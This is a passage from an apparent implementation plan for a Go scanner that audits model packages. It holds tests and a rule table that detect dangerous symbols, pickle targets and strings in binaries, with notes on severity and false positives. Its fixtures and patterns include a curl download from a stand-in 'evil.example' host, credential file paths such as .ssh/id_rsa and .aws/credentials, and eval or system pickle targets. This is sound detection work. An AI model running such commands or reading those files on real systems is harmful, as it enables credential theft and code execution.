	set.Finalize()
	return set
}
```

- [ ] **Step 4: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -v -run 'TestCollect|TestELF|TestPickle|TestString|TestStream|TestShannon|TestEntropy|TestClassify' 2>&1 | tail -30
```

预期全 PASS。

- [ ] **Step 5: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
git commit -m "feat(audit): add the evidence collector with head/tail and completeness accounting"
```

---

### Task 8: 二进制规则表

**Files:**
- Create: `internal/codeaudit/binary_rules.go`
- Test: `internal/codeaudit/binary_rules_test.go`

- [ ] **Step 1: 写失败测试**

创建 `internal/codeaudit/binary_rules_test.go`：

```go
package codeaudit

import "testing"

// TestBinaryRulesBorrowSharedFamilies pins the single-source-of-truth rule: for
// a family both arms can report, the binary side must not carry its own severity.
// The two arms disagreeing about how bad socket use is would make the audit's
// verdict depend on which channel happened to notice.
//
// The severity comparison at the end is a consequence check, not the one that
// does the work: NewBinaryMatcher resolves a shared id straight from
// DefaultRules(), so for a borrowed id that comparison cannot fail on its own.
// What can fail - and what this test is really for - is the shape a re-typed copy
// arrives in, and there are two of them. Both are asserted over the tables rather
// than over the resolved rules, because that is where a copy would live.
//
// Mutation to keep this honest: add `"NET_002": {ID: "NET_002", Severity:
// SeverityMedium}` to binaryOnlyRules. Three assertions go red, across two
// tests. In this test the "reuses a shared id" assertion fires on the injected
// entry itself, and the "both borrowed and restated" branch of the family loop
// fires on the NET_002 family, which is now in both tables. In the same file,
// TestBinaryOnlyFamiliesDoNotCollide also fires: it walks DefaultRules() and
// asks binaryOnlyRules about each id, which is exactly the collision the
// injected entry creates. (An earlier version of this note said only one
// assertion went red and that the collision test could not see the entry; both
// claims were wrong.) What does stay green is the severity comparison at the
// end - NewBinaryMatcher still resolves NET_002 from the shared table, so the
// resolved severity does not move - and the pattern check, because the injected
// entry carries no Patterns.
func TestBinaryRulesBorrowSharedFamilies(t *testing.T) {
	byID := map[string]Rule{}
	for _, r := range DefaultRules() {
		byID[r.ID] = r
	}

	// A binary-only entry must not reuse a shared id, and must not carry the
	// source arm's patterns. The second assertion is the pattern-text half of the
	// same drift: a re-typed copy arrives by copy-pasting a DefaultRules() entry,
	// and that entry has Patterns set, whereas a genuine binary-only rule never
	// does - the patterns live on the family (see binaryFamily), because a Rule's
	// Patterns are the source arm's matcher and the regex and semgrep engines must
	// not carry patterns for text they never read.
	for id, r := range binaryOnlyRules {
		if _, ok := byID[id]; ok {
			t.Errorf("binary-only rule %s reuses a shared id; DefaultRules() is the source of truth for that id, so this entry is dead - and any severity or pattern text it states can drift from the one that is used", id)
		}
		if len(r.Patterns) != 0 {
			t.Errorf("binary-only rule %s carries %d source-arm patterns; binary patterns belong on the family, and a Rule that carries them is a copy of a DefaultRules() entry rather than a decision", id, len(r.Patterns))
		}
	}

	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatalf("NewBinaryMatcher: %v", err)
	}

	// Every family must be in exactly one table, and must have at least one
	// pattern. A family with no patterns matches nothing and nothing else
	// notices it: it resolves fine, it sits in Rules(), and it silently never
	// fires - which is a family that has been dropped without a trace.
	for _, fam := range binaryFamilies {
		_, borrowed := byID[fam.ID]
		_, stated := binaryOnlyRules[fam.ID]
		switch {
		case borrowed && stated:
			t.Errorf("family %s is both borrowed from DefaultRules() and restated in binaryOnlyRules; leave it in one place", fam.ID)
		case !borrowed && !stated:
			t.Errorf("family %s is in neither DefaultRules() nor binaryOnlyRules", fam.ID)
		}
		if len(fam.Patterns) == 0 {
			t.Errorf("family %s has no patterns: it can never match, and nothing else notices", fam.ID)
		}
	}

	for _, r := range matcher.Rules() {
		shared, ok := byID[r.ID]
		if !ok {
			continue // a binary-only family states its own severity, by design
		}
		if r.Severity != shared.Severity || r.Category != shared.Category {
			t.Errorf("%s: binary side says (%s,%s), the shared table says (%s,%s)",
				r.ID, r.Category, r.Severity, shared.Category, shared.Severity)
		}
	}
}

// TestBinaryOnlyFamiliesDoNotCollide keeps the two tables from drifting into
// each other: a binary-only family that reused a source family's id would shadow
// it and silently change the source arm's severity.
func TestBinaryOnlyFamiliesDoNotCollide(t *testing.T) {
	for _, r := range DefaultRules() {
		if _, ok := binaryOnlyRules[r.ID]; ok {
			t.Errorf("binary-only family %s collides with a source family of the same id", r.ID)
		}
	}
}

func TestMatchEvidenceSymbolFamilies(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		source EvidenceSource
		text   string
		want   string
	}{
		{SourceDynsym, "connect", "NET_002"},
		{SourceDynsym, "socket", "NET_002"},
		{SourceDynsym, "getaddrinfo", "NET_002"},
		{SourceDynsym, "system", "CMD_001"},
		{SourceDynsym, "execve", "CMD_001"},
		{SourceDynsym, "popen", "CMD_001"},
		{SourceDynsym, "dlopen", "DYN_001"},
		{SourceDynsym, "memfd_create", "BIN_002"},
		{SourceDynsym, "fexecve", "BIN_002"},
		{SourceNeeded, "libcurl.so.4", "NET_002"},
		{SourcePickle, "posix.system", "PKL_001"},
		{SourcePickle, "subprocess.Popen", "PKL_001"},
		{SourcePickle, "builtins.eval", "PKL_001"},
		{SourceEntropy, "high-entropy-executable-section .text 7.94", "BIN_001"},
		{SourceStrings, "/bin/sh", "CMD_002"},
		{SourceStrings, "curl -o /tmp/x http://evil.example/p", "CMD_002"},
		{SourceStrings, "/etc/passwd", "FIL_002"},
		{SourceStrings, "/root/.ssh/id_rsa", "FIL_002"},
		{SourceStrings, "crontab -l", "PER_002"},
		{SourceStrings, "AWS_SECRET_ACCESS_KEY", "ENV_002"},
	}
	for _, tc := range cases {
		got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text})
		if got == nil {
			t.Errorf("no rule matched %s %q, want %s", tc.source, tc.text, tc.want)
			continue
		}
		if got.ID != tc.want {
			t.Errorf("%s %q matched %s, want %s", tc.source, tc.text, got.ID, tc.want)
		}
	}
}

// TestMatchEvidenceRejectsTheBenignNeighbours is the other half of a rule table:
// it is only as good as what it refuses. A pickle stream's ordinary contents and
// a compiled binary's ordinary imports must not produce findings, or the channel
// becomes noise the operator learns to ignore.
func TestMatchEvidenceRejectsTheBenignNeighbours(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		source EvidenceSource
		text   string
	}{
		{SourcePickle, "torch._utils._rebuild_tensor_v2"},
		{SourcePickle, "collections.OrderedDict"},
		{SourcePickle, "numpy.core.multiarray._reconstruct"},
		{SourceDynsym, "malloc"},
		{SourceDynsym, "memcpy"},
		{SourceDynsym, "pthread_create"},
		{SourceDynsym, "mmap"},
		{SourceDynsym, "mprotect"},
		{SourceNeeded, "libc.so.6"},
		{SourceNeeded, "libm.so.6"},
		{SourceStrings, "model accuracy on the validation set"},
		{SourceStrings, "training epoch 3 complete"},
		{SourceSection, ".text size=1048576 executable=true"},
		{SourceMember, "archive/data.pkl size=1024"},
		{SourceNotice, "interpreter /lib64/ld-linux-x86-64.so.2"},
		// Each of these is a measured false positive of the previous table, kept
		// here so a later widening has to argue with the evidence: `bind` on its
		// own is a server, the two trailing runs are fragments of a concatenated
		// string table rather than the paths they spell, and `private_key` is
		// the lower-case identifier ENV_001 matched because it carries (?i) -
		// ENV_002 drops the flag, and this line pins that the drop holds.
		{SourceDynsym, "bind"},
		{SourceStrings, ".profilez /etc/cron) crontabz"},
		{SourceStrings, ".aws/credentialsz"},
		{SourceStrings, ".ssh/id_rsaz"},
		{SourceStrings, "private_key"},
	}
	for _, tc := range cases {
		if got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text}); got != nil {
			t.Errorf("%s %q matched %s, want no match", tc.source, tc.text, got.ID)
		}
	}
}

// TestSymbolRulesDoNotMatchStringLiterals pins the source restriction that the
// rule table exists to express. The word "connect" in a log message is not a
// capability; the same word in the dynamic symbol table is.
func TestSymbolRulesDoNotMatchStringLiterals(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range []string{"connect", "socket", "system", "execve", "dlopen"} {
		if got := matcher.Match(EvidenceLine{Source: SourceStrings, Text: text}); got != nil {
			t.Errorf("the literal %q matched %s as a symbol; strings are not symbol evidence", text, got.ID)
		}
	}
}

// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs is the bar the table
// has to clear, and it is a bar rather than a preference. The severity column is
// the only control that exists downstream: `Passed` is computed as
// `highCount == 0` (with the medium count added under the `gate` policy), and a
// false `Passed` makes `internal/controller/import_processing.go:655-660` run
// `cleanDirContents` and delete the model package. A rule table that reports a
// HIGH on an ordinary shared object or a compiled .pyc therefore does not merely
// add noise - it destroys the package.
//
// Every fixture below reproduces a shape measured against real files on this
// machine: the string runs of `/home/hjy/taa/models` (740 files of that tree are
// tracked in this repository, so it is not the untracked part - the narrower
// truth is that the .pyc files carrying these fragments are the untracked,
// gitignored ones, which is why the fragments are reproduced as fixtures rather
// than the files being embedded), the 28 shared libraries of a stock ollama
// install, and the .pyc files under this repository, using the stringScanner
// semantics from binary_evidence.go, real `readelf --dyn-syms` output and real
// pickle targets. The measured numbers the shapes stand for - 23 of 28 libraries
// firing a free-string rule, `bind` in libllama-common.so, the TAB-bearing
// `'.profilez\t/etc/cron)'` run in taint_engine.cpython-312.pyc and `crontabz` in
// code_security_analyzer.cpython-312.pyc - are recorded in this task's prose so
// a later reader can repeat the run against the finished table.
func TestBinaryTableProducesNoHighFindingsOnLegitimateInputs(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	fixtures := []struct {
		name  string
		lines []EvidenceLine
	}{
		{"a 120-digit decimal run, as in libllama.so", []EvidenceLine{
			{Source: SourceStrings, Text: "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879"},
		}},
		{"a 120-plus base64-alphabet run, as in a torch data.pkl", []EvidenceLine{
			{Source: SourceStrings, Text: "zpssssssssrrrruuuuvstutsrqqpopotpprsssssssrrrrtuuutqrsrrpooommnnnmpqqqqabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"},
		}},
		{"a .pyc concatenated run holding crontab and /etc/cron mid-run", []EvidenceLine{
			{Source: SourceStrings, Text: ".profilez /etc/cron) crontabz code_security_analyzer"},
		}},
		{"a dynsym listing with bind alone, as in libllama-common.so", []EvidenceLine{
			{Source: SourceDynsym, Text: "bind"},
		}},
		{"a dynsym listing with dlopen and dlsym, as in libgomp.so", []EvidenceLine{
			{Source: SourceDynsym, Text: "dlopen"},
			{Source: SourceDynsym, Text: "dlsym"},
		}},
		// `API_KEY` matches ENV_002 and that is intended - it is a LOW, and the
		// assertion below is about HIGH. The lower-case `private_key` sits here
		// among legitimate identifiers and must not fire anything either; the
		// no-match assertion itself lives in TestMatchEvidenceRejectsThe
		// BenignNeighbours, and the two `...z` runs are the .pyc fragments.
		{"a string run holding ordinary identifiers", []EvidenceLine{
			{Source: SourceStrings, Text: "API_KEY"},
			{Source: SourceStrings, Text: "private_key"},
			{Source: SourceStrings, Text: ".aws/credentialsz"},
			{Source: SourceStrings, Text: ".ssh/id_rsaz"},
		}},
		{"a legitimate kernel's imports", []EvidenceLine{
			{Source: SourceDynsym, Text: "malloc"},
			{Source: SourceDynsym, Text: "memcpy"},
			{Source: SourceDynsym, Text: "pthread_create"},
			{Source: SourceNeeded, Text: "libc.so.6"},
			{Source: SourceNeeded, Text: "libm.so.6"},
		}},
	}
	for _, fx := range fixtures {
		t.Run(fx.name, func(t *testing.T) {
			for _, line := range fx.lines {
				if rule := matcher.Match(line); rule != nil && rule.Severity == SeverityHigh {
					t.Errorf("%s %q produced the HIGH finding %s; a legitimate file must not be able to block the import",
						line.Source, line.Text, rule.ID)
				}
			}
		})
	}
}

// TestBinaryTableStillFiresHighOnStructuralEvidence is the other direction, and
// it is what keeps the test above from being vacuous: a table with no rules at
// all would pass a test that only asserts silence. Every case here is evidence
// the file's own construction produced - a committed pickle parse, a symbol or
// library name the linker wrote, a measured executable-section entropy - and
// each must stay HIGH, so a later recalibration that softens one of them fails
// here rather than silently lowering the bar.
func TestBinaryTableStillFiresHighOnStructuralEvidence(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name string
		line EvidenceLine
		want string
	}{
		{"a pickle target that executes on load", EvidenceLine{Source: SourcePickle, Text: "posix.system"}, "PKL_001"},
		{"a dynsym execve", EvidenceLine{Source: SourceDynsym, Text: "execve"}, "CMD_001"},
		{"a dynsym memfd_create", EvidenceLine{Source: SourceDynsym, Text: "memfd_create"}, "BIN_002"},
		{"a dynsym connect", EvidenceLine{Source: SourceDynsym, Text: "connect"}, "NET_002"},
		{"a client library dependency", EvidenceLine{Source: SourceNeeded, Text: "libcurl.so.4"}, "NET_002"},
		{"a high-entropy executable section", EvidenceLine{Source: SourceEntropy, Text: "high-entropy-executable-section .text 7.94"}, "BIN_001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule := matcher.Match(tc.line)
			if rule == nil {
				t.Fatalf("no rule matched %s %q, want %s", tc.line.Source, tc.line.Text, tc.want)
			}
			if rule.ID != tc.want {
				t.Errorf("%s %q matched %s, want %s", tc.line.Source, tc.line.Text, rule.ID, tc.want)
			}
			if rule.Severity != SeverityHigh {
				t.Errorf("%s is %s; every rule in this test must stay HIGH, so a later downgrade breaks it",
					rule.ID, rule.Severity)
			}
		})
	}
}

// TestBinaryFamilySeveritiesArePinned pins the severity column of the resolved
// table, one family at a time, because that column is the only control that
// decides whether a finding blocks. Under the default `assist` policy `Passed`
// is `highCount == 0`; under `gate` it is `High == 0 && Medium == 0`, and a
// false `Passed` makes internal/controller/import_processing.go:655-660 delete
// the package. The two
// policies therefore impose two different bars, and a family's severity has to
// be right for both: the four string families are LOW, not MEDIUM, precisely
// because MEDIUM would still delete once an operator switches to `gate`.
//
// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs asserts silence at
// HIGH only, which is the `assist` bar; this test is the other half, and the
// half that keeps a later edit from quietly moving a family to MEDIUM and
// turning a warning into a re-import. It reads the rules the matcher resolved,
// not the two tables, so it pins what the scanner will actually report however
// the id was resolved.
func TestBinaryFamilySeveritiesArePinned(t *testing.T) {
	matcher, err := NewBinaryMatcher()
	if err != nil {
		t.Fatal(err)
	}
	resolved := map[string]Rule{}
	for _, r := range matcher.Rules() {
		resolved[r.ID] = r
	}
	cases := []struct {
		id   string
		want string
	}{
		// Structural evidence: the file's own construction produced it, so it
		// may block, and it must keep doing so - a later softening is exactly
		// what the test above cannot catch, because it only ever asserts
		// silence.
		{"BIN_001", SeverityHigh},
		{"BIN_002", SeverityHigh},
		{"PKL_001", SeverityHigh},
		{"NET_002", SeverityHigh},
		{"CMD_001", SeverityHigh},
		// Borrowed and deliberate: MEDIUM does not block under `assist`, but it
		// does under `gate`, so this value is load-bearing too.
		{"DYN_001", SeverityMedium},
		// String evidence must not block under either policy. LOW, and not
		// MEDIUM, because MEDIUM alone deletes the package once the operator
		// switches to `gate`. rules.go defines no SeverityLow constant, so the
		// table writes the string and this test matches it.
		{"CMD_002", "LOW"},
		{"PER_002", "LOW"},
		{"FIL_002", "LOW"},
		{"ENV_002", "LOW"},
	}
	for _, tc := range cases {
		t.Run(tc.id, func(t *testing.T) {
			r, ok := resolved[tc.id]
			if !ok {
				t.Fatalf("%s is not in the resolved table at all", tc.id)
			}
			if r.Severity != tc.want {
				t.Errorf("%s is %s, want %s", tc.id, r.Severity, tc.want)
			}
		})
	}
	if len(cases) != len(matcher.Rules()) {
		t.Errorf("this test pins %d families but the table resolves %d: a new family has to have its severity pinned here too, or nothing notices when it is set to a level that blocks",
			len(cases), len(matcher.Rules()))
	}
}

// TestEveryBinaryRuleHasASuggestion pins that the suggestion map covers the
// binary table. It is written against BinaryRuleIDs rather than a literal list so
// that a family added later fails here instead of shipping a report whose
// recommendation for it says nothing.
func TestEveryBinaryRuleHasASuggestion(t *testing.T) {
	const fallback = "审查该代码片段并确认其安全性"
	for _, id := range BinaryRuleIDs() {
		if SuggestionForRule(id) == fallback {
			t.Errorf("rule %s has no entry in ruleSuggestionMap", id)
		}
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestBinaryFamily|TestBinaryTable|TestMatchEvidence|TestSymbolRules' 2>&1 | head -10
```

预期：编译失败。首屏会同时报 `undefined: NewBinaryMatcher`、`undefined: binaryOnlyRules` 和 `undefined: binaryFamilies`（这一版三个都还没写）——不用管顺序，是编译不过就对了。

- [ ] **Step 3: 实现**

创建 `internal/codeaudit/binary_rules.go`：

```go
package codeaudit

import (
	"fmt"
	"regexp"
	"sort"
)

// binaryOnlyRules are the families only a binary can evidence. They carry their
// own severity because there is no source-side rule with the same id to borrow
// it from; every rule id that does exist in DefaultRules() is looked up there
// instead, so the two channels cannot disagree about a shared family's severity.
//
// The severity column is policy, and the policy this table encodes is one
// sentence: a finding may be HIGH only when it is corroborated by structure the
// file cannot produce by accident. A dynamic symbol table entry, a DT_NEEDED
// name, a committed pickle parse and a measured executable-section entropy are
// all produced by the file's own construction. A free string is not: a .so
// contains whatever text its authors embedded, and a .pyc's constants
// concatenate into runs that contain anything, so a string match is evidence for
// a reader and for the Tier-2 model rather than a verdict on its own.
//
// The reason this has to be stated rather than felt is that the severity column
// is the only control that exists downstream. `Passed` is computed as
// `highCount == 0` under the default `assist` policy, and with the medium count
// added under `gate`, both in ComputeConclusionContext. A false `Passed`
// makes internal/controller/import_processing.go:655-660 run cleanDirContents
// and delete the model package. Measured against the real files on this machine,
// the table as first written deleted legitimate packages: one free-string rule
// fired on 23 of 28 legitimate shared libraries. That is why the four
// string-evidence families below live under new ids at LOW rather than borrowing
// the source arm's severity - the source arm's rules match Python source, where
// a literal in a call is a different fact from a byte run in a binary.
//
// "LOW" is the literal the report path already uses for a non-blocking finding:
// DefaultRules() has no LOW constant, and ClassifyFindingRisk falls through to
// "LOW" for any severity that is neither HIGH nor MEDIUM. A LOW finding still
// reaches the report and still goes to the Tier-2 verifier, which can raise it
// to MALICIOUS on its own evidence; it simply does not block by itself.
var binaryOnlyRules = map[string]Rule{
	"BIN_001": {
		ID:       "BIN_001",
		Category: "加壳载荷",
		// HIGH, not MEDIUM: the reading is a measurement rather than a pattern -
		// an executable section that measures near eight bits per byte has been
		// compressed or encrypted and something must unpack it before it runs -
		// and packing is exactly what this channel exists to catch. The
		// measurement does not misfire on ordinary libraries: across a measured
		// 600 shared objects on the host (538 distinct ELFs, 2027 file entries),
		// none was marked structural, none lacked a section table and none
		// errored, and the highest executable-section entropy was 6.777009
		// bits/byte, on libcrypto.so.3's .text (3347362 bytes, read whole rather
		// than sampled), 0.723 below the 7.5 threshold. libgomp.so's 7.97
		// .gnu_debugdata is not SHF_EXECINSTR so the extractor never measures it.
		Severity:    SeverityHigh,
		Description: "可执行节区熵接近随机 — 代码已被压缩或加密，运行前必须先解包",
	},
	"BIN_002": {
		ID:          "BIN_002",
		Category:    "内存执行",
		Severity:    SeverityHigh,
		Description: "导入 memfd_create/fexecve — 可在内存中落盘并执行载荷，不产生可审计的磁盘文件",
	},
	"PKL_001": {
		ID:          "PKL_001",
		Category:    "反序列化执行",
		Severity:    SeverityHigh,
		Description: "pickle 流要求反序列化器解析具备进程/IO/网络能力的模块属性 — 加载即执行",
	},
	// The four families below carry free-string evidence and are LOW. Their ids
	// are new rather than shared because PER_001 and CMD_001 are HIGH in the
	// source table and FIL_001/ENV_001 are MEDIUM - and MEDIUM is not the safe
	// level either, because under the gate policy it blocks and deletes too.
	// Giving them LOW under a shared id would make the two arms
	// disagree about a shared family's severity, which
	// TestBinaryRulesBorrowSharedFamilies exists to prevent.
	"CMD_002": {
		ID:          "CMD_002",
		Category:    "命令执行（字符串证据）",
		Severity:    "LOW",
		Description: "二进制中的字面量呈现命令行形态 — 需人工确认是配置文本还是执行载荷",
	},
	"PER_002": {
		ID:          "PER_002",
		Category:    "持久化后门（字符串证据）",
		Severity:    "LOW",
		Description: "二进制中的字面量呈现持久化形态 — 需人工确认",
	},
	"FIL_002": {
		ID:          "FIL_002",
		Category:    "敏感文件读取（字符串证据）",
		Severity:    "LOW",
		Description: "二进制中的字面量指向敏感路径 — 需人工确认是读取能力还是日志文本",
	},
	"ENV_002": {
		ID:          "ENV_002",
		Category:    "环境变量（字符串证据）",
		Severity:    "LOW",
		Description: "二进制中的字面量是一个密钥型环境变量名 — 需人工确认",
	},
}

// binaryFamily is the evidence one family can be shown by.
//
// Sources is not an optimisation. Without it a rule written for symbol names
// would fire on a string literal that happened to spell one, and the operator
// would get a HIGH finding for a log line. The restriction states, in the place
// the rule is written, what kind of fact the rule is about.
type binaryFamily struct {
	ID       string
	Sources  []EvidenceSource
	Patterns []*regexp.Regexp
}

// binaryFamilies is the table, in match-precedence order. The order is the
// precedence: one evidence line produces at most one finding, so the first rule
// that matches owns the line, and a line two families could describe would be
// counted once rather than double-weighted in the statistics. No two families
// in the table as written actually overlap (see Match), so that rule is held for
// the first overlap rather than exercised today.
//
// The claim sets are narrower than the source arm's on purpose, and the
// narrowing is the fix for the false positives this table was measured to have.
// A rule whose claim is a bare identifier or a substring catches every
// legitimate file that happens to contain it - which for a model package means
// a deleted package, not a noisy report.
var binaryFamilies = []binaryFamily{
	{
		// memfd_create and fexecve lead the table so that, if the general
		// command family's claim is ever widened to cover them, the more
		// specific family is the one that names the finding. Today CMD_001's
		// list is anchored and names neither, so the pair does not overlap and
		// the position is held for that widening rather than exercised now.
		ID:       "BIN_002",
		Sources:  []EvidenceSource{SourceDynsym},
		Patterns: compilePatterns(`^(memfd_create|fexecve)$`),
	},
	{
		// The symbol half of command execution, and the half that is structural:
		// a dynamic symbol table entry is written by the linker, so a binary that
		// imports system() has the capability. Only SourceDynsym - the string
		// half lives in CMD_002 below, because the same word in a literal is not
		// a capability.
		//
		// The same corpus run that produced the NET_002 measurement puts this
		// family on a legitimate library too: `nm -D` shows
		// libggml-base.so.0.20.2 importing `execlp`, so CMD_001 reports HIGH on
		// ggml's own backend loader. That is the same undecided posture the
		// NET_002 note records, left undecided here for the same reason.
		ID:      "CMD_001",
		Sources: []EvidenceSource{SourceDynsym},
		Patterns: compilePatterns(
			`^(system|execve|execv|execvp|execl|execlp|execle|popen|posix_spawn|posix_spawnp|forkpty|WinExec|ShellExecuteA|ShellExecuteW|CreateProcessA|CreateProcessW)$`,
		),
	},
	{
		// The client half of raw network use. The set was narrowed to the
		// outbound-client shape out of the measurement below, and the narrowing
		// did not achieve what it was for.
		//
		// Measured with the wide symbol readers (`nm -D`, or `readelf -sW
		// --dyn-syms`; plain `readelf --dyn-syms` truncates long names to
		// `[...]` and hides `socket` and `connect` in particular) against the 28
		// shared libraries of this machine's ollama bundle: the generic and
		// server-side symbols - `bind`, `send`, `recv` - are imported by
		// libllama-common.so, a legitimate library, so dropping them did remove
		// that match. But the client symbols were kept, and they sit in the same
		// libraries: libllama-common.so.0.1.2 and libllama-server-impl.so both
		// import `socket`, `connect` and `getaddrinfo` alongside
		// `bind`/`send`/`recv`, and the CUDA runtime libraries under
		// cuda_v12/cuda_v13 import `bind`/`connect`/`socket`.
		//
		// So on this machine's bundle NET_002 reports HIGH on legitimate
		// libraries, and under the default `assist` policy, where `Passed` is
		// `highCount == 0`, that means passed=false for a package that holds one
		// of them. The "or needs libcurl" half of the original claim does hold:
		// no library in the bundle carries a curl or ssl DT_NEEDED.
		//
		// This is not a mis-written comment; it is a rule posture that was never
		// decided. Narrowing the pattern set further, dropping the family to
		// MEDIUM, and requiring it to co-occur with another family are all open,
		// and this task chooses none of them - it records the measurement and
		// leaves the decision unmade. The shared id and its severity are the
		// source arm's, so as written this family stays HIGH.
		ID:      "NET_002",
		Sources: []EvidenceSource{SourceDynsym, SourceNeeded},
		Patterns: compilePatterns(
			`^(socket|connect|getaddrinfo|gethostbyname|gethostbyaddr|inet_addr|inet_pton|WSAStartup|WSASocketA|WSASocketW)$`,
			`^libcurl\.so`,
			`^libssl\.so`,
		),
	},
	{
		// MEDIUM, borrowed from the shared table. It stays: dlopen is ordinary in
		// legitimate shared objects, but the evidence is structural - the symbol
		// table says the library declares the capability - and the shared
		// severity is the source arm's to set.
		ID:       "DYN_001",
		Sources:  []EvidenceSource{SourceDynsym},
		Patterns: compilePatterns(`^(dlopen|dlmopen|dlsym)$`),
	},
	{
		ID:      "PKL_001",
		Sources: []EvidenceSource{SourcePickle},
		Patterns: compilePatterns(
			// Process execution. The module list is a deny list of capabilities,
			// not an allow list of libraries: an allow list would have to name
			// every legitimate rebuilder torch has ever shipped, and would fail
			// open on the first one it had not heard of.
			`^(?:posix|nt|os)\.(?:system|popen|exec[a-z]*|spawn[a-z]*|fork|forkpty|kill|killpg|setuid|setreuid|seteuid|dup2)$`,
			`^(?:subprocess|pty|commands|runpy|importlib)\.\w+$`,
			`^(?:builtins|__builtin__)\.(?:eval|exec|compile|__import__|open)$`,
			`^(?:ctypes|socket|webbrowser)\.\w+$`,
		),
	},
	{
		// The string half of command execution, at LOW. Only genuine command-line
		// shapes survive here: a bare symbol name in a literal is what
		// TestSymbolRulesDoNotMatchStringLiterals refuses, and an unanchored
		// substring catches a fragment of a concatenated constant pool.
		ID:      "CMD_002",
		Sources: []EvidenceSource{SourceStrings},
		Patterns: compilePatterns(
			`^/bin/(sh|bash|dash|zsh)$`,
			`^(bash|sh) -c\b`,
			`\b(curl|wget)\s+.*https?://`,
		),
	},
	{
		// Token-anchored at both ends. The previous patterns fired on
		// `'crontabz'` and on `'.profilez\t/etc/cron)'`, both fragments of a
		// concatenated .pyc constant pool, where a mid-run path always matches an
		// unanchored pattern. A boundary on the token, not the fragment, is the
		// fix; raising the severity would not have been.
		//
		// The two fragments come from different files, which an earlier version
		// of this note got wrong by attaching both to one of them.
		// `'.profilez\t/etc/cron)'` (a TAB, not a space) is the single occurrence
		// in models/audit/tools/cpg/__pycache__/taint_engine.cpython-312.pyc,
		// which contains no `crontab` substring at all. `'crontabz'` is in
		// models/examples/__pycache__/code_security_analyzer.cpython-312.pyc,
		// where the source literal `r"crontab"` in
		// models/examples/code_security_analyzer.py has picked up the trailing
		// `z` from the concatenation - the fragment is real, only the file was
		// misattributed.
		ID:      "PER_002",
		Sources: []EvidenceSource{SourceStrings},
		Patterns: compilePatterns(
			`^crontab\b`,
			`^/etc/cron[a-z.]*`,
			`(?:^|/)\.bashrc$`,
			`(?:^|/)\.bash_profile$`,
			`^systemctl\s+(enable|start)`,
			`^/etc/systemd/system`,
			`^/etc/init\.d`,
		),
	},
	{
		// Same anchoring requirement, same measurement. `'.aws/credentialsz'`
		// and `'.ssh/id_rsaz'` were the observed fragments; the trailing `z` is
		// proof the match was a fragment of a concatenated run.
		//
		// The `$` alone is not what refuses them. It refuses a *suffixed*
		// neighbour - `'.aws/credentialsz'` stops matching `\.aws/credentials$`
		// because the `$` will not sit at the `z`. It does not refuse an
		// *invented* key name: `id_[a-z]+` consumes `id_rsaz`'s trailing `z`
		// happily, so the `$` is satisfied and the fragment matches anyway. Only
		// a closed key-name list refuses that, which is why the `.ssh`
		// alternation names the four real keys rather than reaching for
		// `id_[a-z]+`.
		ID:      "FIL_002",
		Sources: []EvidenceSource{SourceStrings},
		Patterns: compilePatterns(
			`^/etc/(?:passwd|shadow|sudoers)$`,
			`^(?:.*/)?\.ssh/(?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys|config)$`,
			`^(?:.*/)?\.aws/credentials$`,
			`(?:^|/)\.kube/config$`,
			`^/proc/self/environ$`,
		),
	},
	{
		// Exact case, and no (?i). The source arm's ENV_001 carries (?i) because
		// it matches `os.getenv("AWS_SECRET_ACCESS_KEY")`, an upper-case name by
		// convention; the same flag here made the lower-case identifier
		// `private_key` match `PRIVATE_KEY` in security.cpython-312.pyc. A bare
		// identifier is a name, not a secret read.
		ID:      "ENV_002",
		Sources: []EvidenceSource{SourceStrings},
		Patterns: compilePatterns(
			`^(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|API_KEY|SECRET_KEY|ACCESS_TOKEN|PRIVATE_KEY|GITHUB_TOKEN)$`,
		),
	},
	{
		ID:       "BIN_001",
		Sources:  []EvidenceSource{SourceEntropy},
		Patterns: compilePatterns(`^high-entropy-`),
	},
}

// There is deliberately no OBF_001 family here, and its absence is a decision
// rather than an omission. The source arm keeps OBF_001 for
// `base64.b64decode(...)` and friends, where the evidence is a call. The binary
// arm originally matched `^[A-Za-z0-9+/]{120,}={0,2}$` against SourceStrings,
// and that is where 23 of 28 legitimate shared libraries fired: the pattern
// matches any 120-plus-byte run drawn from the base64 alphabet, which is
// everywhere in binary data and in .pyc string tables - a plain 120-digit
// decimal run in libllama.so.0.1.2 is enough. Tightening the alphabet or raising
// the floor does not help, because the runs are real and long; the honest fix is
// an occupancy guard on a whole unit (the section or member must be
// predominantly the encoded run, not merely contain one), and no producer for
// that unit-level verdict exists in this plan. So the family is dropped here and
// the absence is stated rather than left to be rediscovered.

// BinaryMatcher resolves the binary family table against the shared severity
// table and matches evidence lines against it.
type BinaryMatcher struct {
	rules []Rule
	order []binaryFamily
}

// NewBinaryMatcher builds the matcher, resolving every family id to a Rule.
//
// Resolution happens here, at construction, rather than per finding: a family id
// that is in neither table is a programming error, and a matcher that silently
// skipped it would drop a whole family's findings without a trace. The engine
// selector makes the same choice for the same reason.
func NewBinaryMatcher() (*BinaryMatcher, error) {
	shared := map[string]Rule{}
	for _, r := range DefaultRules() {
